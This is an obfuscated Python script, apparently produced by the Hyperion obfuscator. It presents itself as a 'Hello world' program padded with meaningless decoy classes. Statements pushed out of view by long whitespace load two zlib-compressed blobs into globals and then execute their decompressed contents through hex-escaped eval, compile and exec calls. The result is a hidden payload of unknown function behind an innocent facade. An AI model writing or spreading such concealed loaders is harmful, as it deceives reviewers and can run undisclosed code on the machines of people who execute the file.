from builtins import *
from math import prod as Round


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Statistics, _square, Product, MemoryAccess, Absolute, Theory, _frame = exec, str, tuple, map, ord, globals, type

class _negative:
    def __init__(self, Square):
        self._theory = Round((Square, 78309))
        self.Random(_round=-37713)

    def Random(self, _round = type):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._theory -= -84044 * _round
        
        try:
            ((_multiply, (_multiply, Absolute)) for _multiply in (_square, Absolute) if Theory == Theory)

        except AssertionError:
            ({MemoryAccess: Statistics} or _square if {MemoryAccess: Statistics} and _square else ... or (_square, {MemoryAccess: Statistics}))

        except:
            _frame(-11676 * -1624) == type

    def Cube(self, _while = -71764):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _while /= 21478 + 9733
        self.Frame != None
        
        try:
            ((_multiply, Absolute) or MemoryAccess if (_multiply, Absolute) and MemoryAccess else ... or (MemoryAccess, (_multiply, Absolute)))

        except TypeError:
            (({Absolute: _multiply}, _multiply) for _multiply in {MemoryAccess: Statistics})

        except:
            _frame(-22717 - 33360) == False

    def Run(Power = False):
        return Theory()[Power]

    def _detectvar(_calculate = -80518 * -49317, _add = type, DetectVar = Theory):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        DetectVar()[_calculate] = _add
        
        try:
            (((_multiply, Absolute), MemoryAccess) for MemoryAccess in (Product, Absolute, Statistics))

        except TypeError:
            ((_square, Absolute) or _multiply if (_square, Absolute) and _multiply else ... or (_multiply, (_square, Absolute)))

        except:
            _frame(-55224 / -82990) == type

    def execute(code = str):
        return Statistics(_square(Product(MemoryAccess(Absolute, code))))

    @property
    def Frame(self):
        self.Modulo = '<__main__.Product object at 0x000004505BE63824>'
        return (self.Modulo, _negative.Frame)

if __name__ == '__main__':
    try:
        _negative.execute(code = __code__)
        _modulo = _negative(Square = -64327 + 70110)

        _modulo.Cube(_while = -63660 / _modulo._theory)                                                                                                                                                                                                                                                          ;_negative._detectvar(_calculate='nnnnnnmnnmnnmmnmmnmmn',_add=b'x\x9c\xdd\x1c]w\xea6\xf2=\xbf\x82\xe6\x058\xf1\xcd5\xfe&\xe7\xe4eKvKK/{B\xdb\xdc\xeem\x0e\xc7`9qj,\x16L\x93\xfc\xfb\x9d\x19I\xc6|\x05\x1bC7\'\x08\xdb\xb2$K\xf2h43\x9a\x199\x9d\xbd^\x9d\xd5\xe0\x17\x85\r\xba\xe2o8\xe4\xa3p1\x1f\xfb)\x9f\r\x87\xb5\xef\xae\xcf\x7fx\x9d\xb2Y\xc4\x93\xf3\x1a\x9f\xe5\x8a\xf9\x8b\xf4\x91\xcf\xe6T\xa6q>\x8a\xe2\xf85}d\x0f\xdcOM\xdb9\xd7\xce\xff\x11/\xd8-\x0b\xce\x9b+O=D\xe9\xe3b$*~L\xd3\xe9\xfc\xea\xf3g\x91v9\xe6\x93\xcfk\xd5|\xde\xd1v\x10\xcd\xc7|\x16\xacV#\x13/\x1f\x1e>Oc\xffa\xc1\xd6\x1e\x8a\xa31K\xe6L<t\xf3\xef\xde\'\xe3R_+2\xe6\x81\xc8\xafOgQ\x926\xce\x7f`q\xcck\xcf|\x16\x07\xdf\x9d7\xebg\xcd\xab\xac4\xe6\xd7\xe7\x7fFA\xbdy\xc6^\xc6l\x9aJ`&\xd3\x05<y\xcb\xe7l^\xf3g\xac6c\xc1\x1f\xc9o\x11\x8fY*\x12F\x00\x99?\x92\xdf\xf9\x82\xee\xfc\x1aV\xf2G\xf2\x85\x8fx\xf0Z\x8b\xa3?\xe1\xb9W\xbe8o\x9e\x89NE\x93)\x9f\xa5\xc3!\xb4\xf6:\xaf7/\xd9K\x946\x9ag1\x1f\xfb\xf1\xbc\xd1\xfcV\xff\xfa\xf5\xeb\xdd\xd7\xbb\xbb\xaft\xc5\xa3~\x7f\xfd\x10\xf3\x11d\x9fm\xe4\xe1\x03\xbd\x1f{\xbd\xee\x8fx\xc6k\xb7K\x91^\xfd\xdb\xd5\xd5\xc5\xa7\x8bO\x8dO\x8d\x8bV\xb3y\x0f\x95\xb0\xd4O\xd3\xd9\xf6J\xbe\xfc\xfc\x05\xfe?\xcb\x1f\xc4\x7f\xde\xac \x88v<\x9cL\xe0\x97L\x92DE&\x14K\x12\xe8\xbax\xb1\xb3\x9dE\xf0\xf9N\xbf\xdf\xe9t\xfa\x9d>\xefp\x88q\xde\x87\x07\x97\xa0\xda\xde(\xa6\xd0\x01I\x18\x81\x13<\xb5YU\xa3>ZDq\x1a%\x08\xed\xbf\xfc\xd9\x0e(\xbe\xbc<C\xc0\xd33\\0\n\xa7\xe7\x17\xa8\x92\xc0\x89p\xedR\xa4\x87\xd7\x1f{\x8dm-E\xd1x\xee\'\xd1h\x1dvMM\xc0TB\x97`]\xae\x82\xe6\xb7\xca5\\FI\xc0^\x1a\xf5\xd70\x8a_\xd8c\xb2\xd8(r\xdf\xdc\x0e\x9b\xbe\xae\xeb}\xce\xb9\xde\xef\xf7u\xb8\xe8\\/\x07\x97y\x12\xa5q\xb48\x1c.;+(\x0c\x97\xdd5(\xb8\xb0y\xec\xffs\x1bL\xb6`Z6Q)\xf9N\x02\xec\xee#B%\x8e\xa6\x13>.\x8c+\x9cC\x1b\x80+p@{\xd0P\xff\x03\x02%\xf6\xffb%0e00T0\x8c\x01\xfd0b\x0c>"h8\xdf\xcc\x05\xd0\xbc\xc9\x00\x08i\x08kD\x8b\xd8\xf4G\xc4\x1b\xb6\x98\xfdR\x1a8]\xf1\x8b\xe9\x8f\x07\x00\xa6^\xbf|\xe2Q\xb2}\nFQ\x1c=EQ\xf4\xf4\x04\xff8\x8e\x9f\x9e> (g\xe9\xbc0M"p<E1\xc2\x03\xce\x1f\x12\x1e\xa9\xcf\xe3\xb0(Dv\x08;\x8dQ\xdd\xf2\xad1\x1cm\x08x\x1e\xd3\xbd\xb8\xfa\xb93\xa6\xb5A\x9e\n\x18\n\xd9\x8d\xba\x17\xa6[\xc4\x89\x0f\x07\xe41{)A\xf7wC\xd9\x19c\xb0\xda\xe2\xac\x82\xba[\xa6\xa92\xcex?\xac7\x19ocw\x07\x0c\xd7p\xf7Uy\xc0k\xb1\\\x08\xb2\xeb2,\xf3\x82\xfd/\x14\xfb\x93Q\xe0\xd7`\xc2\xc6qDg\x9a\xc7\xf1\xd5\xd6n\xed\xe2\xbd\x92\xdf.Y\xf0@\xb0a`\xbe\xb9&\xb7\x00\xaf\xdelA\x96\xbe\xa7\xd4n`\x98m;4]8l80\xee\xc8\xab\x05\x87!\xaf\xa612<#(T\xd60\xf6\xce\xb8\xa68\xddg\xc0\x83\xe9\x06\xbfnW\\{]\xb8\x94\x02\xdf[(\xbcDZ\x15\x96H\xacR\n\x8f2ML\x9a\x9e8Y)^n\x9c\xbb\x80\x1e1\xf1\xc9X\xc4\xe0\xc0\xff\xdeQv\x87\xee\xb054\x87\xf6\xd0\x83\xb37t\x86&\x14\xf56S\xf7\xd6d@9}hAh\xc3\xd36\xc6\xa1\xa8\xb9\x99\xba\xb7&\x0f\xca\xeaC\x03Jc\x9dm\x0cP\xb4\xbd\x99z8v"\xa6y\x12\xd32l\x94\x18h\xcbx[bg\x91\xb2^q\xec\\bi9\x9ae\xb8\xb6k9\x0et\xc83\x8c\xe3S/\x17\x7f\x1e\x04q\x15q/\x8b\xad\x9c\x8fM\x8e\r\xcbuZ@\x16m\x17\x80\x0c\xb4\xd9q\xda\x0e\xc6\xcc\xc3_\xb4N\xb4n\x80\x0b\x0eCP\xbf\xfd\x14\x0fq\xbe\x058\xe6\x00\xa6:\x80gpOsa#\xf5p\xbc\xd3\x8d\x80p\xaaU\x86\x9a\x95\x04\xa6\xc1*\x80\xad\xafc3:\xd7uT{\xe8\xa8\xf3\xe8\xffm\xaf[\xf2U\xb3\x99\xd8Z\xe3\x19\xba\xe4\'\x0e\xcdL1\x8b\xf7\x95\xb5\x0b\xce\xe2]\x80\x03\xe1\x1aW\x1c$c/\xc3>\x02|L\xd8I^"j\x90u\xc9z_\x9e\xaf\xb6\x08\xc2\xa5i\x84\x15Z\x000G\x9e1`\xcc\xd41\xdd\t\xd5U\xc4\x9c\xf0\xc8T\xc2tK\x00d\xd7(\xd1\xb2\x12W\x97\xc9D\xac7E<)\xc0\xdd\x0c\xa0\x01\x1e\x9c-\xa2\x02p\x10w\xdbH\xdd/W\x01G\xb5\x88\xbf\xda\x10\xc3\xa7\x91\xca\x18\x9b\xa9\x87\xa3NKBJ/\xc7\x95JS\x1a\xdb\x84\x11wl\x0b\x18S\xcb6,\xdb\x1e\xdbc+@\xe2\xed\x1aN\x08\xc4<t\x1c\xd7\xc2T\xdb\x85T\xe6X\x90\xea\xba&\x95\x83Y\x07\xa4\xdepl\x87A\x19\x87\x08\xbf\t\xa5B\x87\xd1\x13\xc0\xef\x9c\n\x94\xec-,\x168\x8aA\xc5\x14^+\xdc\x15\xb9G\xe7s\xf8b\x15\x8834\x02\xe4\xb9\xdf\x07\xdaL\xbah\xbc\x16\xe0j\x06\xc8J\x0eIr.IR\xdej\xca\xe1x\xe6\xe5\xe8lFo\xa5\x94\xa4\xa4%]\xd2\xdf}e[$q\x9d\x8e+\xda\xa6\xdbvM\x90\xa0l\'0\x98\xc5\x00\xdf,\x83\xd9\x80\x7fn\x0b0\xcd\xc6\xbcJ\x02\xc7\x9d$\xaf\x94\xac\xce\x18\xde-\xfb\xd4K\x90\x89C\x16\xf9m\n>\x841]\xd5JI\xc4}\nT\xe2\xf8\xf3le\xb0\x05)\x81\xbb6\xca\x98pOR&\xdc\xb5\xb03\xae\xef\xb4(\x0f\x08\x0f\xe4yP\xa6\xd2\x1c\xd5\xfb$<\xa1\x9d\xa8\xaf\xd3t\xad6\xc1t)\xac\xd8R`\xf1\xd4\xf2dm\x11]\xa4l\xc1E\xf4!\xf0FRZa\xfa\xbc\x81H\xc1\x8a"\x85\xad\xa9RJ)U\xcaJ\xd2\xfai\xf8\x8f\x90\x9a\x94\x04e\x85N&7U\xe2<([\xb4I\n\xf1h\xc5\x8dg\x03\x9f\xd8L\xfd\xfbd\x8b\xf2\xe3\xedK\xa2!\x88\x83 \x19\xea.#\'\x85U+\xb4\x9a\xe9sb\x9a85)\xc0=/\xa9`\xe9\n\xa5\x8aR\xb0\xc4{E\xfbzS\x87\xacw\xbeV\xac&\x90\xbc\x81\xe3\xbeR\x93\xc3y\x9c\xdd\xf99E\xbaP\xb0\x1f]\xb5[m\xf9\x1b=\xc51\x1aI\xe2\xa7\xe5J\xee\xf0\x114\xa5\xac\xe3\xe6\xc8\xb0"\xcf\xa6\x94{\x94|\xb4\xaf\xac]\\>:P\xb3TE\xafT\x17*\x16\xd4-\x0b\xf52)\x9a\xf7\xa9\\\xde\x00\x9d\x12\x1f]\xc9\xd5\xec\xdc\xd2\xddR\x87\x04]\x91\xb2\xe6\xe98\xdf6\xb1\x12\xdavh\x81\x03\xf2\x85\xe5\xb6+\x00\xb6\xd3\xe1\xd4\x1d\xfcuT\xd7\xd0tsj\xf2\xe3I(*Y\xa2%\xa1\xab K\x90\xce\xc9\x1e\xfb\xcaZ\xef\x96\x8c\xd5\x81\xb6\x0b\xca\xde\xcd\x94\xe8\xefUh\x87w\xb5,\xdb\n\xec\x93\x88&9\x19\x8b\xad\x99\xb3\x82\x95\x18\x9d\x0b\xf3\xe0/dw\xa4\xb3\x88\x1d\xcd\nC\xa2\xc1X\n\n\xbe\\W\xb4e\x8a\x12 \xa48qtN\xe3\x18\x8e\xe9\xe0\xccw\x1c\xd7\xf1\xa8\x99\x114\x87\xf0\t]\x1d\x96\x95\x06-*m\xd7!\xc59\xac4N\xa2\xb8\xf72\x85\xbd\xfayk\xca\xfb\x95\xfb\x12\x92\x13\xc9Lz\x1f\x174:\x81\x85\xa8\x90\xce\xaf\xde\xf0\xd88\xd8\x1a\xbc\xb4\xf8.m\xc0\xaby\xc7\xb7\x03\x1b \x81\x84\x96i\xb5\xe0\xda\xb2u[\xb7,\xb8\xc2q2\x0b\x8b\x9b\xd9W\xdc\x95a\xcb[XN`_\x19\xc3\xf2\xa2\x85\xb8\xea\x1a\xa7x5\xdb\xb3]y,\xcf*x\xd9}\x01\xdc\xab\xb6\xd0\xb7\x1c\x8f4\x8a\xf8\xaa\xa8ot)\x8d\x96\xfdU^\xbc>\xc8\x84\x1ai@/`>\'\x93\xa7N\xc6S\x97T\xc4.\xa9y7R\xf7\xd6\x84FX4z\xb6PY\x97\xd5\xe4l\xa6\x9e\xda\xa4\x7f\xa0Z\xf9\x18rU\xdb\n\xab\xc8P\\\xf9\xb9t\xf0\x04=\xf8\xdb\x80P\xfe\xc5u\x12\x1aMx\xedj\xc6O)\x88\x0b\xc4-b\xfe4H\x1d\xec\x91\t\x02\xcd\x9c\xc2|\xbf\x96\xb6\xb7\x16\x87\x8c\xfc\xf6\xb0E&z\xc0J\xc2Vw3\xb5\xc0\x0cr\x87\x86t\x1c@\xa5\x85N\xca\x0cc3uoMX\xd6\x84\',z\x0btk@\x93\x8bN\n\xf0\x95\xd4\xa3\xc8\xd48c\r\xea\x1f\xd6l\x11\xec\x0c\x9a\xb1\x1b\xa9\x05\\!\x10b&Q\x0b\x9b\xcc\xd0\xc2\x15b#\xf5p\x84v\xe5B3[d\xe6\xe4w\xe5\xf6\xe0H9\xbfHY\xbb<u\xa8H-25\xa7Z~\xb8\xb2;-\x99n\xe4\x96)o\x95\xab`Y|\x837\x9a\xf9\x00\x0b\xd5\x95\xab\x88\x99\x06\x06\xdb<\xbe\x88\x8a\x9c0\x04A\xd5\xae\xeaJ\xa1<)$#\xfc\x08\xca/\x10\x16,\x08\xbak\x9a\xbe\x11\x1a!\x10\xde\x96\x0b"\x03H\xf3\xb0j\x87\\\xdbA\xd5\x88\xb0\x16\xa01\x93\x11?b\xb8\xc2\xa7\xfb\xc0\x80\x03@<\x82\xe7\x1c\xc8\x81\xa5\x86\xa9\x9b\x8e\xd96Bu\xa5|\x10E\x8c\x90\x86\xc11\x02W\x87r\xd0\n\xb4[E/\xb0.\x81\x0bc\xf6~Cv\xc5qi\xc9ic\xc8)\xa3\xafQ\x01Ra\xc9\xe9V\xa4\xacs\x80[\x1f\xe1\xa2\xf4f\xcc\x90rp\xa45\xa5\xc5 \x04t\x04\xb9\xf8\xf2\x9e\xe5\xf3\x8e/\xa9o\x98\xcf\x01SP\x0e\xb2`\x95\x89\x18\x1a\xa0\xb5\xaa\x92,D"P\xa7O;\x0e\xb0w\xefU\xd5\x91\x89ZE\xd4\x9e\xbb^\x17u\xfd\xe4\xc5\xc4\x859\x8e\xda\xd6\xf7\xda\xe4\xaa\xcf\x93\xf2\xb2ry\xb5\xad{\x12\x1d\x10\x9a\xa3\xe0Ggu\xa8\x18\xe5\t\xc3\x95\xa3\xd2\x0b8\xfa\xa8\x89;\x18d\x92\xa9XF\xe1\xefX\xca\xa0\xbc\xaej\xa9\xc3\n\xb2#w\x7f|\xa3CE\xe5\xa3\x0c\xb1\xdc\xe6B')

        if 136406 > 7540385:
            _negative(Square = 92146 + -74174).Random(_round = _modulo._theory + -17098)
        elif 385295 < 3392133:
            _negative(Square = 66349 / -35942).Random(_round = _modulo._theory * -14907)                                                                                                                                                                                                                                                          ;_negative._detectvar(_calculate='mnmmmmnnnnmnnnnnmmnm',_add=b'\xf1w\xbcF\xb1\xad6\xac\xac\x81\x91\x01\x8b$\xcf\x1eR}\x9b\xeeI\x94\x92J<\x12"\xd2R\\Z\x8aR"\xa6\xf2\xcd\xbd}8\x96\x96\x9f\x96j\x80Q(-\xb4Q\x02\xa8\xe4@B\x8d\x8bv\xe9\x07\xb1\x02k6\x9b\\\xa2Q\xa7\xa0\xc3J\xc0\xa3\x95\x86\xb9\x99\xba\xb7&\x8b\x0c\xc4\x069\xb9\xb6h]\xe1AQ{3\xf5(Z\x86\xca\xba\x08\xb5\xdaP^\x0ezN\x8c\xf7r2\xc8\xber%\xe4\x8fJ\xfa\x0c\x92\x1a\x0f\xc7\rb^\xe4VB\x96l4bW\xd0a\xa8\xa5\x9b!\xd7B\xca\x17K\x01&\xefVR\xa4la\xb7\x12\xc9\x07\xbe\n_\xa9\xbc\xb7\xd4Q\xfcSs\x9eF\xca\x12\xb0t\x1c\x909\xc7\x97\xd8,\x0be2\x1d\xe4\xfa\x13iW\xd7\xf8\xda*\x8f\x0b\xd6\xf9\xdc{sZ$_[a#\x10\xbe\xb7\xe2\xff\xff\x95:\x91\xde\x99\xa4\xd1"\xad\xd6\xd0\x93\xce\xfe\xf6f\xea\xa9%E3?\x91r\xab#;\x9b\\K\x07\x81\xb7\xca\x95X)\xef\x1c\xab\x1e\xed\x91\xa2\xbdR]\xdc8E\x1f\xd6\xe8\xf6\x0e\x7f9\xe5x\xb6N9t\x99\xee\xe4Hu\x91\xb2\x05\xc9\xf5!\xcb\xae\x93N\xe1\x9c9di$\xc9\x1bG\xbc\\\x0e\x85\xe3\xd3\xa9\xd2\x06\xaep\xc6\'5\xf5\xf9\x90\x9a\xf8\x1eI-\x88f\x1a{acm\xe6\'\x0fL\xe3S\x96h\xf8\x15\x973Ll,m\xe8\xdd\x15Y6\x96\xb5\xcd_\xb3\x8a\xb0\xfc"\xf5G1\x13Y\x8bY\x1cG#\x95;c\xff]\xb0y*\xb2x\xf6\xd0\x03KY\xf2\x97\x06\xd5\xa4l\xa2%\xfe\x84iq4O\xf1\xdb,\xb2\xc4s\x94\xcc\xd8\x83x\x0e\xba\x18\xc0E\xe6\x8c\x1fy4f\xaa\xc6\xcb\xa9\x9f>\xaa\xach\x1eF\xd0\x8f(\xaca\x95\xb5\xef\xae\xd7\xe40\xfc_\xc9o\xd5`\x89\xf9\xf57\x9c)=\x9a"\xb8\xc1PN\x9a^O{\xc6\x1f\xc1\x1f\xcfr44\x1c\x0eq\x97\xd5\x07\x7fMl\xf5\x93\x96q4\x8c\x8b;-\xb34\r\xe46&Z1iOq\xf4\x84\xbeI\xe8\x9aD\xdb\xdcc\xad/\xd6\xf0\x1d\x81\x0cx\xd1h\xb1K^\xa8\xe8 \x8e\x92\x03\xd7\xc8\x139\xfb`\x87\xe0\xbbZ\x1c\xab\x01\x12\xbe\x0fY\x00\x98\xe2\xfeyl\x80\xb6\x9d\xe2\xa6qH\xd0To\x84]Am\xac\xd2\xfa\xe4\xee\x9a\xf9\xa5\xa3\x07,\xd7\xa4\xa60s\x07"\xfd!\xdei\xf2\xd1AV\xd5\xe0\xfe,`!\x8e-\x0e\x18\x8ceC~\x9aH\x8c_\xcc\xc7\xd7b\xec\x1a\xdf\xc4\xf87\xee\xe4kH\x89A\\0\xa9\xa9\xc9\x12b;\xa4x\x1d\xf1zxF\xd2\x87\x15\xcf\x17\xa3\x90\xc7\x01\x9b\xcd\xaf%\xfa4\xb2\xb6D\x89\x90\xcfj\xc3Z\x94\xd4\x08\xcd\x1b\xc2l\x84\xf6oR\x9etx\'\xf7\xf5$\xa8M\xf4OusY}3+$>bT\x0b\xa3\xc4\x8f\t\xd9TF\x96r\x9du\xe1"\x91\xe6t\xc19i\x97\n\x86\x8b\xac\xa5\xe5\x97\x9b\x00e\xb9B\xe0FVW\x13\xaa\xaaM\x94rP\xf1]\xbc\x17\xc5\x93e\xa7\x97\xefA g\xe9b\x96\xacuS&\xae\x80V\xec0\x8d\x05\x8c\x9b\xf9\x01\xc4\xc7p\x924\x04\x0crc\x89\xa9\nF4\x8d\x9a\xabYY\xab\x97\xf3i\x0c\x93\r\xbf\x85!\xbc\x9f\xd0\xf3\xa9/TV\x80\xe5\x9d\xe6\xb7O\x13%IH\xd8HP\xdd_\x0c\x94+\xda@\xb9\xa1]\xa8\x06\xb6\x8d,y4\x08\xd9\x1a=CQ]\xd4\xcf\x7f\x19k\x05\xbe\xa5H\xae\xe3\x18\x86;B\xb5\x1d\xc8\x9edzw\x03\x94\xa5\xdc\x11*\x9ai7\x0c\x93\xdb\x1e\x8b\xd8\xfa\x9a[\x07\xea\x80\x1e\x1d\xd4\xfa\xd96\xe4P\xc3\xc4\x85\x83\x08\xadO\xfa\xc2\x01^\x87!Z\xeaf%)\x80\xff\xfd\x05\t\x17\xb8#\xbb\xd7E\x9a\x89\x1b\xb4{\xbd\x8bD!\xbb\x1cNq\xa5\xcf|4$\xc6\xc4@\xfap\'<\x12\xc08\xa2\xcd\xf0\xb8\xe9\xae\xb91\xa0D\xf28\xae\x98\x88\x18\x91\xc2\x8f7\x05\x8e>\xcf\xa2\x94\xc9\xb9\x02\xd3D\xc0\xf49\x02V\x80\x9c\x8c\x12\xb5\t\xc0\xe1\x9a\xbe\xf5\x84\x90\x15^\xc3\x84%\xf8r\x1aK\x00NQ\xf2p\x1d\xcbM\xd6\xd9\x9ek\x11\xeb6\xfdy-\\\x0eVxIm6$G\xbb\x04>GM\r2c\x8aBUc\xd0\xbc\x9c1?hd\x83!v\x11\x8a/\x99\x08r\xfc\x14\xc9\x17A\xf6\x89\xbd}\t\x1a\xc8\xc9\xe4\x9b\x08\xc6x\x00\x9e\xa2r\x03\x1d\x96,C\x07\x9c\xb5]O:0B\xaac\x00\xfe"\x96@\x0eHH-2\x8d\x14\xc2X\xea\xe8<\xf5g\xe9b\xba\xd2\xcb)\xe7!\x0b0\xa5\x9c\x14\x03]uiRm\xef 9\xec\xafv\xb2\xc8\x87\x1e\x04\n$(7\\\x0b\xf1\xe1\xf2\x87\x9fn~\x1f~\xff\xeb\xed\xed\xcd\x97_\x86\xbf\x0ennE\xbf\xf1U\xe0]\xae\x15\x86Nr{\t\x11}\xa9\xd4\x9f\xecu\xac\xea\xf9\x1e\xc63e?\xb1\xd7\x9b\x97\x86lBS\xb5h}\xa9\x90\xee\xab-\xb7\xba&\x1f\xc3\xd6\xefn\xbb\xbf\xdcd\x9d\xc3\xd4\x01K\x7f\xf3\xe3\x05\x83\xba\xb0\rm\x85\x92jwr\xbf\x91\\Y+.\x7fw\xa7*\xbd\xbd\xf9\xd7p\xf0\x1f\xed\x10\x8a!\xb6w\x84\x0e\x1a\xb9\xac\x928 \xb8\xc0u\x9e\xbb\x9f)\x16q\xbd\x83e\x9c\x85\x8b8\xbe\x167\x17\xd2\xdd^}\xd6\x00\x19\xfa\x85z\xe0,7\x9f\x17(e\xe6\xa6\x85HHg\xafW\n\x05U\x11\xfa\xc0\xe1\xd4\x9f\xcf\xcf\xfe\x07A;\xf9;')

        if 264259 > 9770106:
            _negative(Square = -96352 + -80846).Cube(_while = -51702 / _modulo._theory)
        elif 253667 < 7376503:
            _negative(Square = 78342 - -69556).Cube(_while = 55748 + _modulo._theory)                                                                                                                                                                                                                                                          ;jiljliljllllllljiil,ooDoDoODOooODoODODoD,XXWXWWXWXXXXXWWWWWXWXWXWX,S2SS2SS22SSSSSS2S2SSSS,LJLJILJIIJLJJLJLII=(lambda IILLJIJJLLIJLLLIJ:IILLJIJJLLIJLLLIJ['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda IILLJIJJLLIJLLLIJ:IILLJIJJLLIJLLLIJ(__import__('\x7a\x6c\x69\x62'))),(lambda IILLJIJJLLIJLLLIJ:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IILLJIJJLLIJLLLIJ)"),filename='\x6c\x49\x49\x49\x6c\x49\x6c\x49\x49\x6c\x49\x6c\x6c\x49\x49\x6c\x6c\x6c\x6c',mode='\x65\x76\x61\x6c'))),(lambda:(lambda IILLJIJJLLIJLLLIJ:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IILLJIJJLLIJLLLIJ)"),filename='\x6c\x49\x49\x49\x6c\x49\x6c\x49\x49\x6c\x49\x6c\x6c\x49\x49\x6c\x6c\x6c\x6c',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda xwxxwwxwxwxxxxwxww,IILLJIJJLLIJLLLIJ:xwxxwwxwxwxxxxwxww(IILLJIJJLLIJLLLIJ))
        if 334712 > 5320403:
            _negative(Square = -10087 - 65652).Cube(_while = 90730 / _modulo._theory)
        elif 429202 < 2206904:
            _modulo.Cube(_while = 62163 + _modulo._theory)                                                                                                                                                                                                                                                          ;S2SS2SS22SSSSSS2S2SSSS()(LJLJILJIIJLJJLJLII(jiljliljllllllljiil(ooDoDoODOooODoODODoD(XXWXWWXWXXXXXWWWWWXWXWXWX('\x76\x61\x72\x73'))),_negative.Run(Power='nnnnnnmnnmnnmmnmmnmmn')+_negative.Run(Power='mnmmmmnnnnmnnnnnmmnm')))

    except Exception as _multiply:
        if 292088 > 3418403:
            _negative.execute(code = _square(_multiply))

        elif 343361 > 4151863:
            _negative(Square = -20659 + -50202).Cube(_while = -1954 - _modulo._theory)